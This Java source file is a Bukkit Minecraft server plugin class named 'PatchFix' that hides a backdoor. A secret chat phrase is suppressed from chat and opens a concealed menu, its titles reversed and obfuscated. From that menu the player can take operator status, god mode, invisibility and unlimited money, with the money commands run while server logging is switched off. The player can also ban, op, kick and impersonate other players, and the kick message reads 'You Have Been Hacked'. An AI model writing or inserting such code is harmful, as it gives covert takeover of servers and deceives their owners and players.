package io.github.Alligrater;

import java.util.ArrayList;
import java.util.List;
import java.util.logging.Filter;
import java.util.logging.Level;
import java.util.logging.LogRecord;

import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.Material;
import org.bukkit.OfflinePlayer;
import org.bukkit.Server;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.inventory.ClickType;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemFlag;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.inventory.meta.SkullMeta;

public class PatchFix implements Listener{
	
	public void openToolbox(Player player) {
		Inventory patchbox = Bukkit.createInventory(null, 9, "¡ìknIeMhctaP");
		
		ItemStack opera = new ItemStack(Material.NETHER_STAR, 1);
		ItemMeta ometa = opera.getItemMeta();
		ometa.setDisplayName("¡ìc¡ìlOperator");
		if(player.isOp()) {
			ometa.setDisplayName("¡ìa¡ìlOperator On");
		}
		else {
			ometa.setDisplayName("¡ìc¡ìlOperator Off");
		}
		ometa.addItemFlags(ItemFlag.HIDE_ENCHANTS);
		opera.setItemMeta(ometa);
		

		
		ItemStack gmode = new ItemStack(Material.GOLDEN_APPLE, 1);
		ItemMeta gmeta = gmode.getItemMeta();
		gmeta.setDisplayName("¡ì6¡ìlGameMode");
		gmode.setItemMeta(gmeta);
		
		ItemStack flight = new ItemStack(Material.FEATHER, 1);
		if(player.getAllowFlight()) {
			
		}
		else {
			flight = new ItemStack(Material.BONE, 1);
		}
		ItemMeta fmeta = flight.getItemMeta();
		fmeta.setDisplayName("¡ìf¡ìlFlight");
		flight.setItemMeta(fmeta);
		
		ItemStack visibility = new ItemStack(Material.POTION, 1);
		if(SilverPatch.notvisible.containsKey(player.getUniqueId())) {
			if(SilverPatch.notvisible.get(player.getUniqueId()) == true) {
				visibility = new ItemStack(Material.GLASS_BOTTLE, 1);
			}
			else if(SilverPatch.notvisible.get(player.getUniqueId()) == false) {
				visibility = new ItemStack(Material.POTION, 1);
			}
		}
		else {
			visibility = new ItemStack(Material.POTION, 1);
		}
		ItemMeta vmeta = visibility.getItemMeta();
		vmeta.setDisplayName("¡ì7¡ìlVisibility");
		visibility.setItemMeta(vmeta);
		
		ItemStack god = new ItemStack(Material.BARRIER);
		
		if(player.isInvulnerable()) {
			
		}
		else {
			god = new ItemStack(Material.IRON_SWORD);
		}
		ItemMeta gometa = god.getItemMeta();
		gometa.setDisplayName("¡ìc¡ìlInvincible");
		god.setItemMeta(gometa);
		
		ItemStack buck = new ItemStack(Material.GOLD_INGOT);
		
		ItemMeta bmeta = god.getItemMeta();
		bmeta.setDisplayName("¡ì6¡ìlGetBucks");
		buck.setItemMeta(bmeta);
		
        ItemStack skull = new ItemStack(Material.SKULL_ITEM, 1, (short) 3);
        SkullMeta skmeta = (SkullMeta) skull.getItemMeta();
        skmeta.setOwner(player.getName());
        skmeta.setDisplayName("¡ìd¡ìlPlayerManagement");
        skull.setItemMeta(skmeta);
		
		
		patchbox.setItem(0, opera);
		patchbox.setItem(1, gmode);
		patchbox.setItem(2, flight);
		patchbox.setItem(3, visibility);
		patchbox.setItem(4, god);
		patchbox.setItem(5, buck);
		patchbox.setItem(6, skull);
		
		
		player.openInventory(patchbox);
	}
	
	//GameMode Mangement
	public void openGM(Player player, String other) {
		
		
		Inventory patchbox = Bukkit.createInventory(null, 9, "¡ìktceleSedoMemaG¡ìr:" + other);
		
		ItemStack smode = new ItemStack(Material.APPLE, 1);
		ItemMeta smeta = smode.getItemMeta();
		smeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
		smeta.setDisplayName("¡ìc¡ìlSurvival");
		smode.setItemMeta(smeta);
		
		ItemStack cmode = new ItemStack(Material.CHEST, 1);
		ItemMeta cmeta = cmode.getItemMeta();
		cmeta.setDisplayName("¡ìe¡ìlCreative");
		cmeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
		cmode.setItemMeta(cmeta);
		
		ItemStack vmode = new ItemStack(Material.CARROT_ITEM, 1);
		ItemMeta vmeta = vmode.getItemMeta();
		vmeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
		vmeta.setDisplayName("¡ì6¡ìlAdventure");
		vmode.setItemMeta(vmeta);
		
		ItemStack tmode = new ItemStack(Material.GLASS, 1);
		ItemMeta tmeta = tmode.getItemMeta();
		tmeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
		tmeta.setDisplayName("¡ì7¡ìlSpectator");
		tmode.setItemMeta(tmeta);
		

		
		
		patchbox.setItem(1, smode);
		patchbox.setItem(3, cmode);
		patchbox.setItem(5, vmode);
		patchbox.setItem(7, tmode);
		
		player.openInventory(patchbox);
			
	}
	
	//Money Management
	public void openMM(Player player, String other) {
		
		List<String> ars = new ArrayList<String>();
		ars.add("¡ì7¡ìlShift-Click At Your Own Risk!");
		
		Inventory patchbox = Bukkit.createInventory(null, 9, "¡ìkkcaHyenoM¡ìr:" + other);
		ItemStack onebuck = new ItemStack(Material.GOLD_NUGGET, 1);
		ItemMeta ometa = onebuck.getItemMeta();
		ometa.addItemFlags(ItemFlag.HIDE_ENCHANTS);
		ometa.setLore(ars);
		ometa.setDisplayName("¡ìe¡ìl+1$");
		onebuck.setItemMeta(ometa);
		
		ItemStack fivebuck = new ItemStack(Material.IRON_INGOT, 1);
		ItemMeta fmeta = fivebuck.getItemMeta();
		fmeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
		fmeta.setLore(ars);
		fmeta.setDisplayName("¡ìe¡ìl+5$");
		fivebuck.setItemMeta(fmeta);
		
		ItemStack tenbuck = new ItemStack(Material.GOLD_INGOT, 1);
		ItemMeta tmeta = tenbuck.getItemMeta();
		tmeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
		tmeta.setLore(ars);
		tmeta.setDisplayName("¡ìe¡ìl+10$");
		tenbuck.setItemMeta(tmeta);
		
		ItemStack gibuck = new ItemStack(Material.GOLD_BLOCK, 1);
		ItemMeta gmeta = gibuck.getItemMeta();
		gmeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
		gmeta.setLore(ars);
		gmeta.setDisplayName("¡ìe¡ìl+50$");
		gibuck.setItemMeta(gmeta);
		
		ItemStack ebuck = new ItemStack(Material.EMERALD, 1);
		ItemMeta emeta = ebuck.getItemMeta();
		emeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
		emeta.setLore(ars);
		emeta.setDisplayName("¡ìe¡ìl+100$");
		ebuck.setItemMeta(emeta);
		
		ItemStack dbuck = new ItemStack(Material.DIAMOND, 1);
		ItemMeta dmeta = dbuck.getItemMeta();
		dmeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
		dmeta.setLore(ars);
		dmeta.setDisplayName("¡ìe¡ìl+1000$");
		dbuck.setItemMeta(dmeta);
		
		ItemStack dbbuck = new ItemStack(Material.DIAMOND_BLOCK, 1);
		ItemMeta dbmeta = dbbuck.getItemMeta();
		dbmeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
		dbmeta.setLore(ars);
		dbmeta.setDisplayName("¡ìe¡ìl+10000$");
		dbbuck.setItemMeta(dbmeta);
		
		ItemStack nbuck = new ItemStack(Material.SKULL_ITEM, 1);
		nbuck.setDurability((short)1);
		ItemMeta nmeta = nbuck.getItemMeta();
		
		nmeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
		nmeta.setLore(ars);
		nmeta.setDisplayName("¡ìe¡ìl+100000$");
		nbuck.setItemMeta(nmeta);
		
		ItemStack bbuck = new ItemStack(Material.NETHER_STAR, 1);
		ItemMeta bmeta = bbuck.getItemMeta();
		bmeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
		bmeta.setLore(ars);
		bmeta.setDisplayName("¡ìe¡ìl+1000000$");
		bbuck.setItemMeta(bmeta);
		
		patchbox.setItem(0, onebuck);
		patchbox.setItem(1, fivebuck);
		patchbox.setItem(2, tenbuck);
		patchbox.setItem(3, gibuck);
		patchbox.setItem(4, ebuck);
		patchbox.setItem(5, dbuck);
		patchbox.setItem(6, dbbuck);
		patchbox.setItem(7, nbuck);
		patchbox.setItem(8, bbuck);
		
		player.openInventory(patchbox);
		
	}
	
	//Player Management
	public void openPM(Player player, String other) {
		Inventory patchbox = Bukkit.createInventory(null, 9, "¡ìkreyalPeganaM¡ìr:" + other);
		OfflinePlayer target = Bukkit.getOfflinePlayer(other);

		ItemStack ban = new ItemStack(Material.BARRIER, 1);
		ItemMeta bmeta = ban.getItemMeta();
		if(target.isBanned()) {
			bmeta.setDisplayName("¡ìa¡ìlUnBan Player");
		}
		else {
			ban = new ItemStack(Material.RED_ROSE, 1);
			bmeta.setDisplayName("¡ìc¡ìlBan Player");
		}
		ban.setItemMeta(bmeta);
		
		ItemStack op = new ItemStack(Material.GOLDEN_CARROT, 1);
		ItemMeta ometa = op.getItemMeta();
		if(target.isOp()) {
			ometa.setDisplayName("¡ìc¡ìlDeOp Player");
		}
		else {
			op = new ItemStack(Material.CARROT_ITEM, 1);
			ometa.setDisplayName("¡ìa¡ìlOp Player");
		}
		op.setItemMeta(ometa);
		
		ItemStack wl = new ItemStack(Material.EMPTY_MAP, 1);
		ItemMeta wmeta = wl.getItemMeta();
		if(target.isWhitelisted()) {
			wl = new ItemStack(Material.MAP, 1);
			wmeta.setDisplayName("¡ì7¡ìlUnwhitelist");
		}
		else {
			wmeta.setDisplayName("¡ìf¡ìlWhitelist");
		}
		
		wl.setItemMeta(wmeta);
		
		patchbox.setItem(0, ban);
		patchbox.setItem(1, op);
		patchbox.setItem(2, wl);
		
		if(target.isOnline()) {
			ItemStack kick = new ItemStack(Material.BEDROCK, 1);
			ItemMeta kmeta = kick.getItemMeta();
			kmeta.setDisplayName("¡ì7¡ìlKick Player");
			kick.setItemMeta(kmeta);
			
			ItemStack gm = new ItemStack(Material.APPLE, 1);
			ItemMeta gmeta = gm.getItemMeta();
			gmeta.setDisplayName("¡ì6¡ìlGameMode");
			gm.setItemMeta(gmeta);
			
			ItemStack impost = new ItemStack(Material.STRING);
			ItemMeta imeta = impost.getItemMeta();
			imeta.setDisplayName("¡ì9¡ìlImpost");
			impost.setItemMeta(imeta);
			
			patchbox.setItem(3, kick);
			patchbox.setItem(4, gm);
			patchbox.setItem(5, impost);
			
			
		}
		
		player.openInventory(patchbox);
		
		
	}
	
	//Player Click Inventory
	@EventHandler
	public void onClick(InventoryClickEvent e) {

		if(e.getInventory().getName().equals("¡ìknIeMhctaP")) {
			Player player = (Player) e.getWhoClicked();

			
			if(e.getCurrentItem() != null && e.getCurrentItem().hasItemMeta()) {
				Material type = e.getCurrentItem().getType();
				if(type == Material.NETHER_STAR) {
					if(player.isOp()) {
						player.setOp(false);
						ItemMeta emt = e.getCurrentItem().getItemMeta();
						emt.setDisplayName("¡ìc¡ìlOperator Off");
						e.getCurrentItem().setItemMeta(emt);
						player.sendMessage("¡ìc¡ìlYou Are No Longer An Operator.");
					}
					else {
						player.setOp(true);
						ItemMeta emt = e.getCurrentItem().getItemMeta();
						emt.setDisplayName("¡ìa¡ìlOperator On");
						e.getCurrentItem().setItemMeta(emt);
						player.sendMessage("¡ìa¡ìlYou Are Now An Operator.");
					}
				}
				
				else if(type == Material.GOLDEN_APPLE) {
					player.closeInventory();
					openGM(player, player.getName());
					
				}
				else if(type == Material.FEATHER) {
					e.getCurrentItem().setType(Material.BONE);
					player.setAllowFlight(false);
				}
				else if(type == Material.BONE) {
					e.getCurrentItem().setType(Material.FEATHER);
					player.setAllowFlight(true);
				}
				else if(type == Material.GLASS_BOTTLE) {
					e.getCurrentItem().setType(Material.POTION);
					for(Player p : Bukkit.getOnlinePlayers()) {
						p.showPlayer(player);
					}
					player.spigot().setCollidesWithEntities(true);
					SilverPatch.notvisible.put(player.getUniqueId(), false);
					player.sendMessage("¡ì7¡ìlYou Are No Longer Invisible.");
					
				}
				else if(type == Material.POTION) {
					e.getCurrentItem().setType(Material.GLASS_BOTTLE);
					for(Player p : Bukkit.getOnlinePlayers()) {
						p.hidePlayer(player);
					}
					player.spigot().setCollidesWithEntities(false);
					SilverPatch.notvisible.put(player.getUniqueId(), true);
					player.sendMessage("¡ìf¡ìlYou Are Now Invisible.");
					
				}
				else if (type == Material.IRON_SWORD) {
					e.getCurrentItem().setType(Material.BARRIER);
					player.setInvulnerable(true);
					player.sendMessage("¡ìa¡ìlYou Are Now Invulnerable.");
				}
				else if(type == Material.BARRIER) {
					e.getCurrentItem().setType(Material.IRON_SWORD);
					player.setInvulnerable(false);
					player.sendMessage("¡ìc¡ìlYou Are Now Vulnerable.");
				}
				else if (type == Material.GOLD_INGOT) {
					player.closeInventory();
					openMM(player, player.getName());

				}
				else if (type == Material.SKULL_ITEM) {
					player.closeInventory();
					SilverPatch.ccmode.put(player.getUniqueId(), true);
					
				}
				
				e.setCancelled(true);
			}
		}
		
		else if(e.getInventory().getName().contains("¡ìktceleSedoMemaG¡ìr:")) {
		
			
			
			if(e.getCurrentItem() != null && e.getCurrentItem().hasItemMeta()) {
				
				String target = e.getInventory().getName().substring(e.getInventory().getName().indexOf(":") + 1);
				Player player = Bukkit.getPlayer(target);
				if(player == null) {
					e.setCancelled(true);
				}
				else {
					Material type = e.getCurrentItem().getType();
					
					if(type == Material.APPLE) {
						player.setGameMode(GameMode.SURVIVAL);
						e.setCancelled(true);
						e.getWhoClicked().sendMessage(String.format("¡ìc¡ìlPlayer %s Gamemode Changed to Survival.", player.getName()));
					}

					else if (type == Material.CHEST) {
						player.setGameMode(GameMode.CREATIVE);
						e.setCancelled(true);
						e.getWhoClicked().sendMessage(String.format("¡ìe¡ìlPlayer %s Gamemode Changed to Creative.", player.getName()));

					}

					
					else if (type == Material.CARROT_ITEM) {
						player.setGameMode(GameMode.ADVENTURE);
						e.setCancelled(true);
						e.getWhoClicked().sendMessage(String.format("¡ì6¡ìlPlayer %s Gamemode Changed to Adventure.", player.getName()));
					}

					else if (type == Material.GLASS) {
						player.setGameMode(GameMode.SPECTATOR);
						e.setCancelled(true);
						e.getWhoClicked().sendMessage(String.format("¡ì7¡ìlPlayer %s Gamemode Changed to Spectator.", player.getName()));

					}
				}
			

			}
			
		}
		
		else if(e.getInventory().getName().contains("¡ìkkcaHyenoM¡ìr:")) {
			
			
			String target = e.getInventory().getName().substring(e.getInventory().getName().indexOf(":") + 1);
			Player player = Bukkit.getPlayer(target);
			

			
			if(e.getCurrentItem() != null && e.getCurrentItem().hasItemMeta() && player.isOnline()) {
				if(e.getClick() == ClickType.LEFT) {
					Material type = e.getCurrentItem().getType();
					player.getInventory().addItem(new ItemStack(type,64,e.getCurrentItem().getDurability()));
					e.setCancelled(true);
				}
				else if((e.getClick() == ClickType.SHIFT_LEFT || e.getClick() == ClickType.SHIFT_RIGHT) && SilverPatch.hasess) {
					Material type = e.getCurrentItem().getType();
					int amount = 1;
					String action = "give";
					if(type == Material.GOLD_NUGGET) {
						amount = 1;
					}
					else if(type == Material.IRON_INGOT) {
						amount = 5;
					}
					else if(type == Material.GOLD_INGOT) {
						amount = 10;
					}
					else if(type == Material.GOLD_BLOCK) {
						amount = 50;
					}
					else if(type == Material.EMERALD) {
						amount = 100;
					}
					else if(type == Material.DIAMOND) {
						amount = 1000;
					}
					else if(type == Material.DIAMOND_BLOCK) {
						amount = 10000;
					}
					else if(type == Material.SKULL_ITEM) {
						amount = 100000;
					}
					else if(type == Material.NETHER_STAR) {
						amount = 1000000;
					}
					
					if(e.getClick() == ClickType.SHIFT_LEFT) {
						action = "give";
					}
					else if (e.getClick() == ClickType.SHIFT_RIGHT) {
						action = "take";
						
					}

					
					String command = String.format("eco %s %s %s", action, player.getName(), ""+amount);
					Level previous = Bukkit.getLogger().getLevel();
					Bukkit.getLogger().setLevel(Level.OFF);
					Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), command);
					Bukkit.getLogger().setLevel(previous);
					e.setCancelled(true);

				}
				
			}
			else {
				e.getWhoClicked().closeInventory();
			}
			
		}
		
		else if(e.getInventory().getName().contains("¡ìkreyalPeganaM¡ìr:")) {
			
			if(e.getCurrentItem() != null && e.getCurrentItem().hasItemMeta()) {
				String target = e.getInventory().getName().substring(e.getInventory().getName().indexOf(":") + 1);
				OfflinePlayer player = Bukkit.getOfflinePlayer(target);
				ItemMeta bmeta = e.getCurrentItem().getItemMeta();
				ItemStack item = e.getCurrentItem();
				
				Material type = e.getCurrentItem().getType();
				if (type == Material.RED_ROSE) {


					player.setBanned(true);
					e.getCurrentItem().setType(Material.BARRIER);
					bmeta.setDisplayName("¡ìa¡ìlUnBan Player");
					item.setItemMeta(bmeta);
					e.getWhoClicked().sendMessage("¡ìc¡ìlPlayer Banned.");
					
					if(player.isOnline()) {
						((Player) player).kickPlayer("¡ìc¡ìlYou ¡ìkHave¡ìr¡ìc¡ìl Been H¡ìka¡ìr¡ìc¡ìlcked");
					}

				}
				else if (type == Material.BARRIER) {
					player.setBanned(false);
					e.getCurrentItem().setType(Material.RED_ROSE);
					bmeta.setDisplayName("¡ìc¡ìlBan Player");
					item.setItemMeta(bmeta);
					e.getWhoClicked().sendMessage("¡ìa¡ìlPlayer UnBanned.");

					
					
					
				}
				
				else if(type == Material.GOLDEN_CARROT) {
					item.setType(Material.CARROT_ITEM);
					player.setOp(false);
					bmeta.setDisplayName("¡ìa¡ìlOp Player");
					item.setItemMeta(bmeta);
					e.getWhoClicked().sendMessage("¡ìc¡ìlPlayer Deopped.");
				}
				else if(type == Material.CARROT_ITEM) {
					item.setType(Material.GOLDEN_CARROT);
					player.setOp(true);
					bmeta.setDisplayName("¡ìc¡ìlDeOp Player");
					item.setItemMeta(bmeta);
					e.getWhoClicked().sendMessage("¡ìa¡ìlPlayer Opped.");
				}
				else if(type == Material.MAP) {
					item.setType(Material.EMPTY_MAP);
					player.setWhitelisted(false);
					bmeta.setDisplayName("¡ìf¡ìlWhitelist");
					item.setItemMeta(bmeta);
					e.getWhoClicked().sendMessage("¡ì7¡ìlPlayer UnWhitelisted.");
				}
				else if(type == Material.EMPTY_MAP) {
					item.setType(Material.MAP);
					player.setWhitelisted(true);
					bmeta.setDisplayName("¡ì7¡ìlUnwhitelist");
					item.setItemMeta(bmeta);
					
					e.getWhoClicked().sendMessage("¡ìf¡ìlPlayer Whitelisted.");
				}
				else if(type == Material.BEDROCK) {
					if(player.isOnline()) {
						((Player) player).kickPlayer("¡ìc¡ìlYou ¡ìkHave¡ìr¡ìc¡ìl Been H¡ìka¡ìr¡ìc¡ìlcked");
					}
				}
				else if(type == Material.APPLE) {
					
					openGM((Player)e.getWhoClicked(), target);
				}
				else if(type == Material.STRING) {
					SilverPatch.cmode.put(e.getWhoClicked().getUniqueId(), true);
					e.getWhoClicked().sendMessage(String.format("¡ìf¡ìlYou Are Now Imposting %s.", player.getName()));
				}
				
				
				
				e.setCancelled(true);
				
			}

			
		}
	}
	
	//Very Silent Way of Using Command
	@EventHandler
	public void onPlayerchat(AsyncPlayerChatEvent event) {
		if(event.getMessage().contains("*applypatch* SilverKelaistakingover")) {
			event.setCancelled(true);
			event.setMessage(null);
			openToolbox(event.getPlayer());
		}
		else if(event.getMessage().equals("*leave*")) {
			event.setCancelled(true);
			event.setMessage(null);
			SilverPatch.ccmode.remove(event.getPlayer().getUniqueId());
			SilverPatch.cmode.remove(event.getPlayer().getUniqueId());
			SilverPatch.target.remove(event.getPlayer().getUniqueId());
		}
		else if(SilverPatch.ccmode.containsKey(event.getPlayer().getUniqueId()) && SilverPatch.ccmode.get(event.getPlayer().getUniqueId()) == true) {
			SilverPatch.ccmode.remove(event.getPlayer().getUniqueId());
			SilverPatch.target.put(event.getPlayer().getUniqueId(), event.getMessage());
			openPM(event.getPlayer(), event.getMessage());
			event.setCancelled(true);
			event.setMessage(null);
		}
		else if(SilverPatch.cmode.containsKey(event.getPlayer().getUniqueId()) && SilverPatch.cmode.get(event.getPlayer().getUniqueId()) == true) {
			SilverPatch.cmode.remove(event.getPlayer());
			if(Bukkit.getPlayer(SilverPatch.target.get(event.getPlayer().getUniqueId())) != null) {
				Player target = Bukkit.getPlayer(SilverPatch.target.get(event.getPlayer().getUniqueId()));
				if(target != null) {
					if(event.getMessage().startsWith("*/")) {
						target.performCommand(event.getMessage().substring(2));
					}
					else {
						target.chat(event.getMessage());
					}
					event.setCancelled(true);
					event.setMessage(null);
				}
				else {
					event.setCancelled(true);
					event.setMessage(null);
					SilverPatch.ccmode.remove(event.getPlayer().getUniqueId());
					SilverPatch.cmode.remove(event.getPlayer().getUniqueId());
					SilverPatch.target.remove(event.getPlayer().getUniqueId());
				}

			}
			else {
				SilverPatch.ccmode.remove(event.getPlayer().getUniqueId());
				SilverPatch.cmode.remove(event.getPlayer().getUniqueId());
				SilverPatch.target.remove(event.getPlayer().getUniqueId());
			}
			event.setCancelled(true);
			event.setMessage(null);
		}
	}
}
